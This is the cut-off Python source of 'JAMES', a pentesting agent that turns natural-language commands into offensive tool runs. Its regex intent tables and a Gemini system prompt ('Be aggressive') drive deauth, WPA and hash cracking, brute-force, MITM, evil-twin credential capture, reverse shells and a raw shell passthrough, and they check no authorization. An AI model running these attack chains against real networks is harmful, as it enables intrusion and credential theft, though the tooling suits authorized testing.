"""
JAMES Agent Brain.

Rule-based command interpreter that understands pentesting intent,
plans multi-step actions, and drives the orchestrator. Acts as the
"AI" layer between user natural-language input and tool execution.
"""

import os
import re
import json
import logging
from datetime import datetime
import shlex
import threading
from dataclasses import dataclass, field
from pathlib import Path

logger = logging.getLogger(__name__)

try:
    from google import genai
    from google.genai import types
    HAS_GENAI = True
except ImportError:
    HAS_GENAI = False

from james.core.orchestrator import Orchestrator


@dataclass
class AgentAction:
    """A single planned action the agent will execute."""
    description: str
    method: str          # orchestrator method name
    args: dict = field(default_factory=dict)
    requires_confirm: bool = False


@dataclass
class AgentPlan:
    """Multi-step plan the agent generates from user input."""
    intent: str
    summary: str
    actions: list[AgentAction] = field(default_factory=list)


# ── intent patterns ─────────────────────────────────────────────

INTENT_PATTERNS = [
    # Recon / scanning (specific before generic)
    (r"(?:masscan|mass\s*scan)\s+(.+)", "masscan"),
    (r"(?:quick\s*scan|fast\s*scan)\s+(.+)", "quick_recon"),
    (r"(?:full\s*scan|deep\s*scan|thorough\s*scan)\s+(.+)", "full_scan"),
    (r"(?:os\s*detect|fingerprint)\s+(.+)", "os_detect"),
    (r"(?:port\s*scan)\s+(.+)", "recon"),
    (r"(?:ssl|tls)\s+(?:scan|check|audit)\s+(.+)", "ssl_scan"),
    (r"(?:web\s*scan|nikto)\s+(.+)", "web_scan"),
    (r"(?:waf|firewall)\s+(?:detect|check|scan)\s+(.+)", "waf_detect"),
    (r"(?:scan\s*aps|nearby\s*aps|nearby\s*networks|show\s*aps)(?:\s+(\S+))?", "scan_aps"),
    # Stealth/passive recon must be before the generic 'recon' catch-all
    (r"(?:stealth\s*recon|passive\s*recon|silent\s*recon)\s+(\S+)", "oneclick_stealth_recon"),
    # Discovery (must be before generic recon catch-all)
    (r"(?:arp\s*scan|arp\s*discover|lan\s*scan|network\s*discover|host\s*discover)(?:\s+(\S+))?", "arp_discover"),
    (r"(?:web\s*vuln\s*scan)\s+(\S+)", "nikto_scan"),
    (r"(?:smb\s*enum|enum4linux|smb\s*scan|netbios)\s+(\S+)", "smb_enum"),
    (r"(?:dns\s*lookup|nslookup|resolve)\s+(\S+)(?:\s+(\S+))?", "dns_lookup"),

    # WPS / WEP / WPA3 / IoT — must be BEFORE generic scan catch-all
    (r"(?:wash|wps\s*scan|scan\s*wps|wps\s*detect)(?:\s+(\S+))?", "wash_scan"),
    (r"(?:wep\s*(?:attack|crack|hack)|crack\s*wep|attack\s*wep)\s+(\S+)(?:\s+(\S+))?", "wep_attack"),
    (r"(?:wps\s*brute|brute\s*wps|wps\s*pin|pin\s*brute)\s+(\S+)(?:\s+(\d+))?", "wps_brute"),
    (r"(?:wpa3\s*(?:check|scan|detect|probe)|sae\s*(?:check|scan|detect))\s+(\S+)(?:\s+(\S+))?", "wpa3_check"),
    (r"(?:wpa3\s*(?:downgrade|attack|crack)|sae\s*(?:downgrade|attack)|dragonblood)\s+(\S+)(?:\s+(\d+))?", "wpa3_downgrade"),
    (r"(?:iot\s*scan|iot\s*recon|smart\s*home\s*scan|device\s*scan)\s+(\S+)", "iot_scan"),
    (r"(?:ble\s*scan|bluetooth\s*scan|bt\s*scan)(?:\s+(\S+))?", "ble_scan"),
    (r"(?:mqtt\s*scan|mqtt\s*probe|mqtt\s*enum)\s+(\S+)", "mqtt_scan"),

    # Generic recon catch-all (MUST be last in this section)
    (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),

    # Wi-Fi
    (r"(?:list|show)\s+(?:interfaces?|wifi|wlan|wireless)", "list_interfaces"),
    (r"(?:enable|start|turn\s*on)\s+monitor(?:\s+(?:mode\s+)?(?:on\s+)?(\S+))?", "monitor_on"),
    (r"(?:disable|stop|turn\s*off)\s+monitor(?:\s+(?:mode\s+)?(?:on\s+)?(\S+))?", "monitor_off"),
    (r"deauth(?:enticate)?\s+(\S+)(?:\s+(\d+))?", "deauth"),
    (r"(?:capture|sniff)\s+(?:handshake|packets?)\s+(?:on\s+)?(\S+)", "capture"),
    (r"(?:auto\s*pwn|autopwn|auto\s*hack|auto\s*crack)(?:\s+(\S+))?", "autopwn"),

    # One-Click Hacks
    (r"(?:wifi\s*blitz|blitz\s*wifi|wifi\s*nuke)(?:\s+(\S+))?", "oneclick_wifi_blitz"),
    (r"(?:network\s*dominate|dominate|net\s*dominate|net\s*pwn)\s+(\S+)", "oneclick_network_dominate"),
    (r"(?:web\s*pwn|web\s*hack|web\s*nuke)\s+(\S+)", "oneclick_web_pwn"),
    (r"(?:evil\s*twin|rogue\s*ap)(?:\s+(\S+))?", "oneclick_evil_twin"),
    (r"(?:(?:connect|find|get|join|grab)\s*(?:to\s*)?(?:an?\s*)?(?:open\s*|free\s*)?(?:wifi|wi-fi|wireless|network|internet|hotspot|ap)|(?:need|want|gimme)\s*(?:some\s*)?(?:wifi|wi-fi|internet|network))", "connect_open_wifi"),

    # OSINT
    (r"(?:osint|harvest|recon\s*domain|domain\s*recon)\s+(\S+)", "osint"),
    (r"(?:whois)\s+(\S+)", "whois"),
    (r"(?:dns\s*enum|dns\s*recon|dig)\s+(\S+)", "dns_enum"),


    (r"(?:gobuster|dir\s*brute|dir\s*bust)\s+(\S+)", "dir_brute"),
    (r"(?:sqlmap|sqli|sql\s*inject(?:ion)?)\s+(\S+)", "sqli"),

    # Network attacks
    (r"(?:arp\s*spoof|arp\s*poison|mitm)\s+(\S+)(?:\s+(\S+))?", "mitm"),
    (r"(?:responder|llmnr|nbt\s*poison)(?:\s+(\S+))?", "responder"),
    (r"(?:sniff|capture\s*packets?|tcpdump|tshark)(?:\s+(\S+))?", "sniff"),

    # Exploit
    (r"(?:reverse\s*shell|rev\s*shell|listener)(?:\s+(\d+))?", "reverse_shell"),
    (r"(?:msf|metasploit|msfconsole)(?:\s+(.+))?", "msf"),

    # Cracking
    (r"crack\s+(?:wpa|handshake|cap)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_wpa"),
    (r"crack\s+(?:hash(?:es)?)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_hash"),

    # Brute force
    (r"(?:brute\s*force|hydra|brute)\s+(\S+)(?:\s+(\S+))?", "brute"),

    # System
    (r"(?:system\s*check|check\s*tools?|status)", "system_check"),
    (r"(?:list|show)\s+skills?", "list_skills"),
    (r"(?:list|show)\s+(?:wordlists?|word\s*lists?|dicts?|dictionaries)", "list_wordlists"),
    (r"(?:show|list|get)\s+primers?(?:\s+(\w+))?", "show_primer"),
    (r"(?:net\s*guard|network\s*guard|connection\s*status|self.?protect)", "net_guard_status"),
    (r"(?:run|execute|load)\s+skill\s+(\S+)", "run_skill"),
    (r"set\s+(\w+)\s+(.+)", "set_context"),
    (r"(?:help|commands?|what\s+can)", "help"),
    (r"(?:history|log|task\s*log)", "show_log"),
    (r"(?:report|generate\s*report|export\s*report)", "report"),
    (r"(?:show\s*loot|loot|cracked|captured\s*keys|show\s*keys)", "show_loot"),
    (r"(?:remote\s*(?:access|control)|enable\s*(?:remote|ssh)|start\s*ssh|ssh\s*server)", "remote_access"),
    (r"(?:kill\s*james|kill\s*all|stop\s*everything|emergency\s*stop|stop\s*all\s*tools?|cleanup\s*all|nuke|abort|kill\s*tools?|shut\s*down|shutdown)", "kill_james"),
    (r"(?:clear|reset)", "clear"),

    # Direct command passthrough
    (r"^!\s*(.+)", "shell"),
    (r"^(?:run|exec(?:ute)?)\s+(.+)", "shell"),
]

# Pre-compile patterns once at import time for fast matching
_COMPILED_INTENTS = [(re.compile(p), intent) for p, intent in INTENT_PATTERNS]


class Agent:
    """
    Conversational pentesting agent.

    Parses natural-language input, generates execution plans,
    and drives the Orchestrator to carry them out.
    """

    MAX_HISTORY = 200  # cap conversation memory to limit RAM
    CONTEXT_FILE = Path.home() / ".james" / "context.json"

    # Keys that should persist across restarts
    _PERSIST_KEYS = {
        "target", "interface", "wordlist", "domain", "lhost", "lport",
        "gateway", "username", "target_url", "target_bssid",
        "discovered_services", "scan_history", "victim",
    }

    # Pronouns / shorthand that reference last target
    _PRONOUN_RE = re.compile(
        r"^(?:scan|recon|enumerate|full scan|deep scan|brute|nikto|gobuster|"
        r"sqlmap|smb enum|dns lookup|whois|osint|ssl scan|waf detect|"
        r"web scan|web pwn|os detect|masscan|crack|sniff)\s+"
        r"(?:it|that|this|them|target|host|again|more|same|deeper)$",
        re.I
    )

    def __init__(self, orchestrator: Orchestrator):
        self.orch = orchestrator
        self.context: dict = self._load_context()
        self.history: list[dict] = []
        self.last_intent: str = "default"
        self.genai_client = None
        
        if HAS_GENAI and os.environ.get("GEMINI_API_KEY"):
            self.genai_client = genai.Client()

    def _load_context(self) -> dict:
        """Load persisted context from disk."""
        try:
            if self.CONTEXT_FILE.exists():
                data = json.loads(self.CONTEXT_FILE.read_text())
                if isinstance(data, dict):
                    logger.info("Restored %d context keys from %s", len(data), self.CONTEXT_FILE)
                    return data
        except Exception as e:
            logger.warning("Failed to load context: %s", e)
        return {}

    def _save_context(self):
        """Persist important context keys to disk."""
        try:
            self.CONTEXT_FILE.parent.mkdir(parents=True, exist_ok=True)
            persist = {k: v for k, v in self.context.items() if k in self._PERSIST_KEYS and v}
            self.CONTEXT_FILE.write_text(json.dumps(persist, indent=2))
        except Exception as e:
            logger.warning("Failed to save context: %s", e)

    def process(self, user_input: str) -> str:
        """
        Main entry point. Takes user text, returns agent response.
        May execute tools as a side effect.
        """
        text = user_input.strip()
        if not text:
            return ""

        # ── Pronoun / shorthand resolution ──────────────────────
        text = self._resolve_pronouns(text)

        self.history.append({"role": "user", "content": text})

        # Try LLM first
        if self.genai_client:
            resp = self._process_with_llm(text)
            if resp is not None:
                self.history.append({"role": "agent", "content": resp})
                return resp

        # Fallback to Regex
        intent, match = self._match_intent(text)
        if intent is None:
            self.last_intent = "default"
            resp = self._fallback(text)
        else:
            self.last_intent = intent
            resp = self._dispatch(intent, match, text)

        self.history.append({"role": "agent", "content": resp})
        # Prevent unbounded growth — keep last MAX_HISTORY entries
        if len(self.history) > self.MAX_HISTORY:
            self.history = self.history[-self.MAX_HISTORY:]
        # Persist context after every command
        self._save_context()
        return resp

    def _resolve_pronouns(self, text: str) -> str:
        """Replace pronouns like 'it', 'that', 'deeper' with the actual target."""
        target = self.context.get("target", "")
        if not target:
            return text

        # "scan it", "brute that", "full scan deeper"
        if self._PRONOUN_RE.match(text.strip()):
            # Replace the pronoun word at the end with the target
            parts = text.rsplit(None, 1)
            if len(parts) == 2:
                resolved = f"{parts[0]} {target}"
                logger.info("Pronoun resolved: '%s' → '%s'", text, resolved)
                return resolved

        # "what ports" / "what services" — show last scan context
        lower = text.lower().strip()
        if lower in ("what ports", "open ports", "show ports", "ports"):
            return f"scan {target}"
        if lower in ("what services", "services", "show services"):
            return f"full scan {target}"
        if lower in ("hack it", "hack that", "pwn it", "pwn that", "attack it", "attack that"):
            return f"network dominate {target}"
        if lower in ("web it", "web that", "web attack"):
            url = self.context.get("target_url", f"http://{target}")
            return f"web pwn {url}"
        if lower in ("deeper", "go deeper", "more", "enumerate more", "dig deeper"):
            return f"full scan {target}"

        return text

    def _process_with_llm(self, text: str) -> str | None:
        try:
            system_prompt = """You are JAMES, an autonomous pentesting agent running on Parrot OS.
You control various pentesting tools. Map the user's natural language to the correct JSON action.
Be aggressive and thorough — always pick the most relevant attack tool.
Available Actions:
- {"action": "quick_recon", "target": "<IP/Domain>"} -> Fast nmap scan
- {"action": "full_scan", "target": "<IP/Domain>"} -> Deep nmap scan  
- {"action": "os_detect", "target": "<IP>"} -> OS fingerprinting
- {"action": "arp_discover"} -> LAN host discovery via ARP
- {"action": "list_interfaces"} -> List Wi-Fi interfaces
- {"action": "monitor_on", "iface": "<interface>"} -> Start monitor mode
- {"action": "monitor_off", "iface": "<interface>"} -> Stop monitor mode
- {"action": "deauth", "bssid": "<mac>", "count": <int>} -> Send deauth frames
- {"action": "nikto_scan", "target": "<URL>"} -> Web vulnerability scan
- {"action": "dir_brute", "target": "<URL>"} -> Directory brute-force
- {"action": "sqli_scan", "target": "<URL>"} -> SQL injection test
- {"action": "smb_enum", "target": "<IP>"} -> SMB shares/users enumeration
- {"action": "dns_lookup", "domain": "<domain>", "type": "ANY"} -> DNS resolution
- {"action": "brute", "target": "<IP>", "service": "ssh"} -> Network brute-force (ssh/ftp/smb/rdp)
- {"action": "web_pwn", "target": "<URL>"} -> Full web attack chain
- {"action": "stealth_recon", "target": "<domain>"} -> Passive OSINT chain
- {"action": "network_dominate", "target": "<IP/CIDR>"} -> Full network attack
- {"action": "crack_wpa", "file": "<capture_file>", "wordlist": "<path>"} -> Crack WPA
- {"action": "crack_hash", "file": "<hash_file>", "wordlist": "<path>"} -> Crack hash
- {"action": "autopwn", "iface": "<interface>"} -> Fully autonomous Wi-Fi audit
- {"action": "run_skill", "name": "<skill_name>"} -> Run automated skill workflow
- {"action": "set_context", "key": "<key>", "value": "<value>"} -> Set context variable
- {"action": "chat", "message": "<text>"} -> Respond conversationally if no tool is needed

Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
"""
            # Inject current context so LLM knows what's active
            ctx_info = ""
            if self.context.get("target"):
                ctx_info += f"Current target: {self.context['target']}\n"
            if self.context.get("interface"):
                ctx_info += f"Active interface: {self.context['interface']}\n"
            svcs = self.context.get("discovered_services", {})
            if svcs:
                for tgt, info in list(svcs.items())[:3]:
                    ctx_info += f"Known services on {tgt}: {', '.join(info.get('services', []))}\n"

            # Build conversation history for LLM context
            contents = ""
            if ctx_info:
                contents += f"[System Context]\n{ctx_info}\n"
            for msg in self.history[-10:]:
                role = "User" if msg["role"] == "user" else "Agent"
                contents += f"{role}: {msg['content']}\\n"
            
            response = self.genai_client.models.generate_content(
                model='gemini-2.5-pro',
                contents=contents,
                config=types.GenerateContentConfig(
                    system_instruction=system_prompt,
                    temperature=0.0,
                    response_mime_type="application/json",
                )
            )
            
            data = json.loads(response.text)
            action = data.get("action")
            self.last_intent = action or "default"
            
            if action == "chat":
                return data.get("message", "...")
            elif action == "quick_recon":
                target = data.get("target")
                self.context["target"] = target
                return self._format_scan(self.orch.quick_recon(target), target, "Quick")
            elif action == "full_scan":
                target = data.get("target")
                self.context["target"] = target
                return self._format_scan(self.orch.full_scan(target), target, "Full")
            elif action == "os_detect":
                class MockMatch:
                    def group(self, i): return data.get("target")
                return self._do_os_detect(MockMatch(), None)
            elif action == "list_interfaces":
                return self._do_list_interfaces(None, None)
            elif action == "monitor_on":
                class MockMatch:
                    def group(self, i): return data.get("iface")
                return self._do_monitor_on(MockMatch(), None)
            elif action == "monitor_off":
                class MockMatch:
                    def group(self, i): return data.get("iface")
                return self._do_monitor_off(MockMatch(), None)
            elif action == "deauth":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("bssid")
                        if i==2: return str(data.get("count", 10))
                        return None
                return self._do_deauth(MockMatch(), None)
            elif action == "crack_wpa":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("file")
                        if i==2: return data.get("wordlist")
                        return None
                return self._do_crack_wpa(MockMatch(), None)
            elif action == "crack_hash":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("file")
                        if i==2: return data.get("wordlist")
                        return None
                return self._do_crack_hash(MockMatch(), None)
            elif action == "run_skill":
                class MockMatch:
                    def group(self, i): return data.get("name")
                return self._do_run_skill(MockMatch(), None)
            elif action == "autopwn":
                class MockMatch:
                    def group(self, i): return data.get("iface")
                return self._do_autopwn(MockMatch(), None)
            elif action == "set_context":
                key = data.get("key")
                val = data.get("value")
                self.context[key] = val
                return f"✅ Context updated (via AI): {key} = {val}"
            # ── New tool actions ────────────────────────────────
            elif action == "arp_discover":
                return self._do_arp_discover(re.match(r"(.*)", ""), None)
            elif action == "nikto_scan":
                target = data.get("target", "")
                self.context["target"] = target
                result = self.orch.nikto_scan(target)
                vulns = result.get("vulnerabilities", [])
                lines = [f"🌐 Nikto Scan — {target}", f"{len(vulns)} finding(s)", ""]
                for v in vulns[:20]:
                    lines.append(f"  ⚠ {v}")
                return "\n".join(lines)
            elif action == "dir_brute":
                target = data.get("target", "")
                self.context["target_url"] = target
                result = self.orch.dir_bust(target)
                if result.get("findings"):
                    lines = [f"📂 Dir Bust — {target}", f"Found {result['total']} path(s)", ""]
                    for f in result["findings"][:20]:
                        lines.append(f"  [{f['status']}] {f['path']}  ({f['size']}B)")
                    return "\n".join(lines)
                return f"📂 Dir Bust — {target}\n\nNo paths found."
            elif action == "sqli_scan":
                target = data.get("target", "")
                result = self.orch.sqli_scan(target)
                if result.get("injectable"):
                    return f"💉 INJECTABLE! {result['vuln_count']} vuln(s) on {target}"
                return f"💉 SQLMap — {target} — not injectable."
            elif action == "smb_enum":
                target = data.get("target", "")
                self.context["target"] = target
                result = self.orch.smb_enum(target)
                lines = [f"📂 SMB — {target}", f"{result.get('share_count', 0)} share(s), {result.get('user_count', 0)} user(s)"]
                for s in result.get("shares", []):
                    lines.append(f"  📂 {s['name']} ({s['type']})")
                return "\n".join(lines)
            elif action == "dns_lookup":
                domain = data.get("domain", "")
                rtype = data.get("type", "ANY")
                result = self.orch.dns_lookup(domain, record_type=rtype)
                records = result.get("records", [])
                lines = [f"🔎 DNS — {domain} ({rtype})", f"{len(records)} record(s)"]
                for r in records[:15]:
                    lines.append(f"  → {r}")
                return "\n".join(lines)
            elif action == "brute":
                target = data.get("target", "")
                service = data.get("service", "ssh")
                self.context["target"] = target
                result = self.orch.brute_service(target, service)
                if result.get("found"):
                    creds = result["credentials"]
                    return f"🔑 CRACKED! {target} ({service}): {creds[0]['login']}:{creds[0]['password']}"
                return f"🔒 No creds found for {target} ({service})"
            elif action in ("web_pwn", "stealth_recon", "network_dominate"):
                # Route these through the regex handler for the one-click hacks
                class MockMatch:
                    def group(self, i): return data.get("target")
                handler = getattr(self, f"_do_oneclick_{action}", None)
                if handler:
                    return handler(MockMatch(), None)
                return None
            else:
                return None  # Let regex handle unknown actions
        except Exception as e:
            logging.error(f"LLM Error: {e}")
            return None

    # ── intent matching ─────────────────────────────────────────

    def _match_intent(self, text: str):
        lower = text.lower().strip()
        for compiled, intent in _COMPILED_INTENTS:
            m = compiled.search(lower)
            if m:
                return intent, m
        return None, None

    # ── dispatch ────────────────────────────────────────────────

    def _dispatch(self, intent: str, match, raw: str) -> str:
        try:
            handler = getattr(self, f"_do_{intent}", None)
            if handler:
                return handler(match, raw)
            return f"[!] Intent '{intent}' recognized but no handler yet."
        except Exception as e:
            return f"[ERROR] {e}"

    # ── handlers ────────────────────────────────────────────────

    def _do_help(self, m, raw) -> str:
        skill_count = len(self.orch.list_skills())
        return f"""⚡ JAMES — Command Reference ({skill_count} skills loaded)

  🔍 Recon & Scanning
    scan <target>          Quick nmap scan
    full scan <target>     Deep service + script scan
    masscan <target>       Ultra-fast full port scan (65535 ports)
    os detect <target>     OS fingerprinting (needs root)
    arp scan               LAN host discovery via ARP
    smb enum <target>      SMB/NetBIOS enumeration

  📡 Wi-Fi
    list interfaces        Show wireless adapters
    enable monitor [iface] Start monitor mode
    disable monitor [iface] Stop monitor mode
    deauth <BSSID> [count] Send deauth frames
    autopwn [interface]    Full autonomous Wi-Fi crack

  🌐 Web & OSINT
    osint <domain>         Harvest emails, subdomains, IPs
    whois <domain>         Domain registration lookup
    dns enum <domain>      DNS record enumeration
    dns lookup <domain>    Quick DNS resolution
    waf detect <url>       Detect web application firewall
    ssl scan <target>      SSL/TLS security audit
    nikto <url>            Web vulnerability scan
    gobuster <url>         Directory brute-force
    sqlmap <url>           SQL injection testing

  🕸️ Network Attacks
    mitm <victim> [gw]     ARP poisoning MITM
    responder [interface]  LLMNR/NBT-NS hash capture
    sniff [interface]      Packet capture & analysis
    brute <target> [proto] Hydra brute-force (ssh,ftp,http...)

  💣 Exploit
    reverse shell [port]   Generate payloads + start listener
    msf [search term]      Metasploit search/exploit

  🔓 Cracking
    crack wpa <file>       Crack WPA handshake
    crack hash <file>      Crack hash file (hashcat)

  ⚙️ System
    status                 Check all {skill_count}+ tools
    list skills            Show {skill_count} skill workflows
    run skill <name>       Execute a skill workflow
    report                 Generate session report
    history                Show task log
    set <key> <value>      Set context variable
    clear                  Reset session context

  🛑 Emergency
    kill james             Stop ALL tools, restore interfaces, reconnect Wi-Fi

  🎯 One-Click Hacks (autonomous attack chains)
    wifi blitz [iface]     PMKID → Handshake → WPS (all vectors)
    network dominate <range> Scan → Fingerprint → Brute → Vulns
    web pwn <url>          WAF → DirBust → SQLi → SSL → Nikto
    stealth recon <target> OSINT → DNS → WHOIS → Scan (passive)
    evil twin [iface]      Rogue AP clone + credential capture

  💻 Shell
    ! <command>            Run a raw shell command

  📚 Wordlists
    list wordlists         Show all available wordlists by category
    set wordlist <path>    Set active wordlist for cracking

  🧠 AI Primers
    show primers           List all AI phase primers
    show primer <phase>    View a specific primer (recon/wifi/web/etc.)

  🛡️ Self-Protection
    net guard              Show network protection status
    (Auto-blocks deauth of your own AP and monitor on your connected interface)

  💡 Context: I remember target, interface, wordlist, etc."""

    def _do_system_check(self, m, raw) -> str:
        status = self.orch.system_check()
        installed = sum(1 for v in status.values() if v)
        total = len(status)
        lines = [f"⚙️ System Tool Status ({installed}/{total} installed):\n"]

        categories = {
            "Scanning": ["nmap", "masscan"],
            "Wi-Fi": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig",
                       "reaver", "bully", "mdk4", "wifite", "hcxdumptool"],
            "Cracking": ["hashcat", "john"],
            "Brute-Force": ["hydra", "medusa", "ncrack"],
            "Web": ["sqlmap", "nikto", "gobuster", "whatweb", "wafw00f", "sslscan"],
            "OSINT": ["theHarvester"],
            "Network": ["responder", "ettercap", "tcpdump", "tshark", "netcat", "socat",
                        "arp-scan", "netdiscover"],
            "SMB/AD": ["enum4linux", "smbclient"],
            "Exploit": ["msfconsole"],
        }

        for cat, tools in categories.items():
            cat_status = [(t, status.get(t, False)) for t in tools]
            cat_ok = sum(1 for _, ok in cat_status if ok)
            lines.append(f"\n  [{cat}] ({cat_ok}/{len(tools)})")
            for tool, ok in cat_status:
                icon = "✅" if ok else "❌"
                lines.append(f"    {icon}  {tool}")

        return "\n".join(lines)

    def _do_recon(self, m, raw) -> str:
        return self._do_quick_recon(m, raw)

    def _do_quick_recon(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.quick_recon(target)
        self._remember_services(target, result)
        return self._format_scan(result, target, "Quick")

    def _do_full_scan(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.full_scan(target)
        self._remember_services(target, result)
        return self._format_scan(result, target, "Full")

    def _do_os_detect(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.nmap.os_detect(target)
        if "error" in result:
            return f"[!] OS detection failed: {result['error']}"
        lines = [f"🖥️ OS Detection — {target}\n"]
        for host in result.get("hosts", []):
            lines.append(f"  Host: {host['address']}")
            for os_m in host.get("os_matches", []):
                lines.append(f"    → {os_m['name']} ({os_m['accuracy']}% match)")
        return "\n".join(lines) if len(lines) > 1 else "No OS matches found."

    def _do_list_interfaces(self, m, raw) -> str:
        ifaces = self.orch.wifi_interfaces()
        if not ifaces:
            return "📡 No wireless interfaces found."
        lines = ["📡 Wireless Interfaces:\n"]
        for i, iface in enumerate(ifaces):
            mode = iface.get("mode", "unknown")
            icon = "🟢" if mode == "Monitor" else "⚪"
            lines.append(f"  {icon}  {iface['interface']}  [{mode}]")
            if i == 0:
                self.context["interface"] = iface["interface"]
        return "\n".join(lines)

    def _do_monitor_on(self, m, raw) -> str:
        iface = m.group(1) or self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: enable monitor <interface>"
        self.context["interface"] = iface
        result = self.orch.start_monitor(iface)
        if result.get("success", False):
            mon_iface = f"{iface}mon" if not iface.endswith("mon") else iface
            self.context["monitor_interface"] = mon_iface
            return f"📡 Monitor mode enabled on {iface}\n    Monitor interface: {mon_iface}"
        return f"[!] Failed to enable monitor mode:\n{result.get('stderr', '')}"

    def _do_monitor_off(self, m, raw) -> str:
        iface = m.group(1) or self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface specified."
        result = self.orch.stop_monitor(iface)
        self.context.pop("monitor_interface", None)
        return f"📡 Monitor mode disabled on {iface}"

    def _do_deauth(self, m, raw) -> str:
        bssid = m.group(1)
        count = int(m.group(2)) if m.group(2) else 10
        iface = self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No monitor interface active. Enable monitor mode first."
        # Network self-protection
        safe, reason = self.orch.net_guard.check_deauth_safe(bssid)
        if not safe:
            return reason
        self.context["target_bssid"] = bssid
        result = self.orch.aircrack.deauth(iface, bssid, count=count)
        return f"💀 Sent {count} deauth frames → {bssid} via {iface}\n{result.stdout[:500]}"

    def _do_crack_wpa(self, m, raw) -> str:
        cap_file = m.group(1)
        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
        bssid = self.context.get("target_bssid")
        result = self.orch.crack_handshake(cap_file, wordlist, bssid)
        if result.get("found"):
            return f"🔑 KEY FOUND!\n\n    Password: {result['key']}\n    Capture:  {cap_file}"
        return f"🔒 No key found in {cap_file} with the provided wordlist."

    def _do_crack_hash(self, m, raw) -> str:
        hash_file = m.group(1)
        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
        result = self.orch.crack_hash(hash_file, wordlist)
        if result.get("success"):
            return f"🔓 Hashcat finished:\n{result['output'][-800:]}"
        return f"[!] Hashcat error:\n{result.get('stderr', '')[:500]}"

    def _do_list_skills(self, m, raw) -> str:
        skills = self.orch.list_skills()
        if not skills:
            return "No skills found."

        # Group by category
        categories = {}
        for s in skills:
            data = self.orch.load_skill(s)
            cat = data.get("category", "other")
            desc = data.get("description", "")
            steps = len(data.get("steps", []))
            categories.setdefault(cat, []).append((s, desc, steps))

        CAT_ICONS = {
            "wifi": "📡", "recon": "🔍", "web": "🌐", "brute-force": "🔓",
            "network-attack": "🕸️", "exploit": "💣", "post-exploit": "🏴",
            "chain": "⛓️", "other": "📦",
        }
        CAT_ORDER = ["recon", "wifi", "web", "brute-force", "network-attack",
                      "exploit", "post-exploit", "chain", "other"]

        lines = [f"📋 Skill Arsenal — {len(skills)} workflows\n"]
        for cat in CAT_ORDER:
            if cat not in categories:
                continue
            icon = CAT_ICONS.get(cat, "📦")
            lines.append(f"  {icon} {cat.upper()} {'─' * (42 - len(cat))}")
            for name, desc, steps in sorted(categories[cat]):
                lines.append(f"    ⚡ {name:<24} {steps} steps  {desc}")
            lines.append("")

        lines.append(f"  💡 Run: run skill <name>")
        return "\n".join(lines)

    def _do_list_wordlists(self, m, raw) -> str:
        inventory = self.orch.list_wordlists()
        if not inventory:
            return "[!] No wordlists found."
        lines = [f"📚 Wordlist Arsenal — {len(inventory)} lists available\n"]
        cats = {}
        for wl in inventory:
            cats.setdefault(wl["category"], []).append(wl)
        for cat, wls in sorted(cats.items()):
            lines.append(f"  ── {cat.upper()} {'─' * (40 - len(cat))}")
            for wl in sorted(wls, key=lambda x: x["lines"], reverse=True):
                size = f"{wl['size_mb']}MB" if wl['size_mb'] >= 1 else f"{int(wl['size_mb']*1024)}KB"
                lines.append(f"    {wl['name']:<35} {wl['lines']:>12,} entries  ({size})")
            lines.append("")
        total = sum(wl["lines"] for wl in inventory)
        lines.append(f"  Total: {total:,} entries across {len(inventory)} lists")
        lines.append(f"\n  💡 Set wordlist: set wordlist <path>")
        return "\n".join(lines)

    def _do_show_primer(self, m, raw) -> str:
        from james.core.primers import list_primers, get_primer, PRIMERS
        phase = m.group(1) if m.lastindex and m.group(1) else None

        if phase:
            phase_lower = phase.lower()
            if phase_lower not in PRIMERS:
                return f"[!] Unknown primer '{phase}'. Available: {', '.join(PRIMERS.keys())}"
            primer = get_primer(phase_lower)
            return f"🧠 AI Primer: {phase_lower.upper()}\n{'─' * 50}\n{primer}"
        else:
            primers_info = list_primers()
            lines = ["🧠 Available AI Primers:\n"]
            for p in primers_info:
                lines.append(f"  • {p['name']:<15} {p['lines']:>3} lines  ({p['chars']:,} chars)")
            lines.append(f"\n  💡 View specific: show primer <name>")
            lines.append(f"  Phases: {', '.join(p['name'] for p in primers_info)}")
            return "\n".join(lines)

    def _do_net_guard_status(self, m, raw) -> str:
        status = self.orch.net_guard.get_status()
        lines = ["🛡️ Network Self-Protection Status\n"]
        lines.append(f"  Enabled:   {'✅ YES' if status['enabled'] else '❌ NO'}")
        lines.append(f"  Connected: {'✅ YES' if status['connected'] else '❌ NO'}")
        if status['connected']:
            lines.append(f"  Interface: {status['interface']}")
            lines.append(f"  Type:      {'📡 Wi-Fi' if status['is_wifi'] else '🔌 Wired'}")
            if status['is_wifi']:
                lines.append(f"  SSID:      {status['ssid'] or '(hidden)'}")
                lines.append(f"  BSSID:     {status['bssid'] or '(unknown)'}")
            lines.append(f"  Gateway:   {status['gateway'] or '(none)'}")
            lines.append(f"  IP:        {status['ip'] or '(none)'}")
            lines.append(f"\n  Protected targets:")
            if status['bssid']:
                lines.append(f"    • BSSID {status['bssid']} — deauth BLOCKED")
            if status['interface']:
                lines.append(f"    • Interface {status['interface']} — monitor mode BLOCKED")
        else:
            lines.append("  ⚠️ No active connection detected")
        return "\n".join(lines)

    def _do_set_context(self, m, raw) -> str:
        key = m.group(1).strip()
        val = m.group(2).strip()
        self.context[key] = val
        return f"✅ Context updated: {key} = {val}"

    def _do_run_skill(self, m, raw) -> str:
        name = m.group(1).strip()
        skill = self.orch.load_skill(name)
        if "error" in skill:
            return f"[!] {skill['error']}"
        
        # Check for required parameters
        missing = []
        for step in skill.get("steps", []):
            for param_key, param_val in step.get("params", {}).items():
